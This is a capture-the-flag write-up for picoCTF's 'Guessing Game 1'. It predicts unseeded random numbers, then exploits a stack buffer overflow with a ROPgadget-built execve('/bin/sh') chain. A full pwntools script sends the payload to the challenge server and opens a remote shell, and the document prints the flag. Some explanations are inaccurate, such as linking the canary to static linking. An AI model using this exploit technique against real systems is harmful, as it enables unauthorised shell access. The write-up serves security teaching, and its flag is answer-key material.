```bash
$ checksec --file=vuln   
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1844 Symbols	  No	0		0		vuln
```

We see that canary is found, it means the program is statically linked. However, in the makefile it states that stack is not protected, which means we can overwrite stuff on the stack, it’s the libc functions that give the status canary found

```bash
$ cat Makefile        
all:
	gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c

clean:
	rm vuln
```

On examining the code a little and the rand() function, we realize that random numbers are not essentially random as the random seed is not specified.
So we write a piece of code to print out the random numbers,

```python
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100

long get_random() {
	return rand() % BUFSIZE;
}

int main(){
	for(int i=0;i<100;i++){
		long a = get_random();
		printf("%d ",a);
   }
}
``` 

On executing the code, we get this as output
```bash
83 86 77 15 93 35 86 92 49 21 62 27 90 59 63 26 40 26 72 36 11 68 67 29 82 30 62 23 67 35 29 2 22 58 69 67 93 56 11 42 29 73 21 19 84 37 98 24 15 70 13 26 91 80 56 73 62 70 96 81 5 25 84 27 36 5 46 29 13 57 24 95 82 45 14 67 34 64 43 50 87 8 76 78 88 84 3 51 54 99 32 60 76 68 39 12 26 86 94 39
```

We see that the first number is 83, on incrementing, we get 84 which can help call the win function

```bash
$ ./vuln
Welcome to my guessing game!

What number would you like to guess?
84
Congrats! You win! Your prize is this print statement!

New winner!
Name? 
```

Now we see a potential buffer overflow option in win function, as buffer size is 100 in the code, but input is 360 bytes

```c
void win() {
   char winner[BUFSIZE];
   printf("New winner!\nName? ");
   fgets(winner, 360, stdin);
   printf("Congrats %s\n\n", winner);
}
```
  

So now we need to find the offset in order to overflow the buffer.To do that we run the program and input the first incremented random number, i.e 84. Then we input a cyclic pattern of 150, we find the offset as below

We see that offset is 120
To get remote access to remote server, we need to launch terminal. 

One way to do that is to call the execve to execute the command “/bin/sh” on the remote server.(google about /bin/sh, bourne shell, shebang for more info)  
To do this we need ROP gadgets and we use ROPgadget tool

The rop chain will allow us to insert string /bin/sh and execute it in remote server.

Here is the command

```bash
$ ROPgadget --binary ./vuln --ropchain  
```
  
  To do so we need several things, for example, we need a register to hold the data address to which we will add the string “/bin/sh” we need an address to hold the string. And than we need a MOV that moves the contents of the address with the string to the data address that will hold the string. To do this we can use the 1st three gadgets of step 1 plus one extra address with to hold the data.

```bash
0x000000000040ea0f : xor rdx, qword ptr [0x30] ; call rdx
0x000000000040ea0e : xor rdx, qword ptr fs:[0x30] ; call rdx

Unique gadgets found: 44426

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x410ca3 pop rsi ; ret
	[+] Gadget found: 0x4163f4 pop rax ; ret
	[+] Gadget found: 0x445950 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x445950 xor rax, rax ; ret
	[+] Gadget found: 0x475430 add rax, 1 ; ret
	[+] Gadget found: 0x475431 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x400696 pop rdi ; ret
	[+] Gadget found: 0x410ca3 pop rsi ; ret
	[+] Gadget found: 0x44a6b5 pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x40137c syscall

- Step 5 -- Build the ROP chain

#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<Q', 0x0000000000410ca3) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x00000000004163f4) # pop rax ; ret
```

To get the data address we do

```bash
$ readelf -S vuln
```
  
Then we see a .bss section header which has flags WA at address 00000000006bc3a0

![[guessingg11.png]]

Here is the pwn script putting the payload and all this together

  
```python
from pwn import *
def convertASCII_to_Hex(value):
     res = ""
     for i in value:
           res += hex(ord(i))[2:]
     return res
     
def changeEndian(value):
     length = len(value)
     res = "0x"
     for i in range(length-1, 0, -2):
           res += value[i-1]+ value[i]
     return res 

def generatestr(value):
     return int(changeEndian(convertASCII_to_Hex(value)), 16)   

def genpayload():
   offset = b'a' * 120
   pop_rsi = p64(0x410ca3)
   data_addr = p64(0x00000000006bc3a0)
   pop_rax = p64(0x4163f4)
   bin_syscall = p64(generatestr("/bin/sh"))
   mov_rsi_rax = p64(0x47ff91)
   pop_rdi = p64(0x400696)                         # pop rdi ; ret
   pop_rdx = p64(0x44a6b5)
   syscall = p64(0x40137c)
   #payload = offset + pop_rsi + data_addr + pop_rax + bin_syscall + mov_rsi_rax + pop_rdi + xor_rax_rax + pop_rdx + syscall
   payload = offset + pop_rax + bin_syscall + pop_rsi + data_addr + mov_rsi_rax + pop_rax + p64(0x3b) + pop_rdi + data_addr + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall
   return payload

def main():
   p = remote('jupiter.challenges.picoctf.org', 38467)
   p.sendline(b'84')
   p.sendline(genpayload())
   time.sleep(.5)
   p.interactive()
   
if __name__=="__main__":

   main()
```

on running the script

```bash
[+] Opening connection to jupiter.challenges.picoctf.org on port 38467: Done
[*] Switching to interactive mode
Welcome to my guessing game!

What number would you like to guess?
Congrats! You win! Your prize is this print statement!

New winner!
Name? Congrats aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf4cA

$ ls
flag.txt
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_580891753d5e9212}$  
```

**FLAG - `picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_580891753d5e9212}`**

[reference](https://mregraoncyber.com/picoctf-writeup-guessing-game-1/)
